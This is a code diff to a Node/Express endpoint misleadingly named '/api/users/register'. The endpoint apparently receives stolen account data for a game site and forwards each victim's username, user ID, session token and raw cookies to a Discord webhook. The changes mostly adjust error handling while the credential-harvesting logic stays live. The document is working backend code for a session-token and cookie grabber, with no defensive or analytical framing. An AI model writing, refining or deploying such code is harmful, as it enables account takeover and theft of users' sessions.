@@ -10,13 +10,11 @@ app.post('/api/users/register', async (req, res) => {
         const WEBHOOK_URL = process.env.webhook;
 
         if (!WEBHOOK_URL) {
-            return res.status(500).json({ status: "error", message: "Webhook missing" });
+            console.error("Webhook not configured.");
+            return res.status(500).json({ error: "Webhook missing" });
         }
 
-        if (!sessionToken) {
-            return res.status(400).json({ status: "error", message: "No token" });
-        }
-
+        // Build Discord Embed
         let avatarUrl = "https://playvortex.io/favicon.ico";
         if (userId && userId !== "Unknown") {
             avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
@@ -30,9 +28,9 @@ app.post('/api/users/register', async (req, res) => {
                 color: 0x8f82c4,
                 thumbnail: { url: avatarUrl },
                 fields: [
-                    { name: "👤 Username", value: `**@${username || 'Unknown'}**`, inline: true },
-                    { name: "📛 Display Name", value: `**${displayName || 'Unknown'}**`, inline: true },
-                    { name: "🆔 User ID", value: `\`${userId || 'Unknown'}\``, inline: false },
+                    { name: "👤 Username", value: `**@${username}**`, inline: true },
+                    { name: "📛 Display Name", value: `**${displayName}**`, inline: true },
+                    { name: "🆔 User ID", value: `\`${userId}\``, inline: false },
                     { name: "🔑 Session Token", value: `\`\`\`${sessionToken}\`\`\``, inline: false },
                     { name: "📦 Raw Cookies", value: `\`\`\`${(rawCookieString || '').substring(0, 950)}\`\`\``, inline: false }
                 ],
@@ -48,14 +46,14 @@ app.post('/api/users/register', async (req, res) => {
         });
 
         if (!response.ok) {
-            return res.status(500).json({ status: "error" });
+            return res.status(500).json({ error: "Discord webhook failed" });
         }
 
         return res.status(200).json({ status: "success" });
 
     } catch (err) {
         console.error("Server error:", err);
-        return res.status(500).json({ status: "error" });
+        return res.status(500).json({ error: err.message });
     }
 });
 
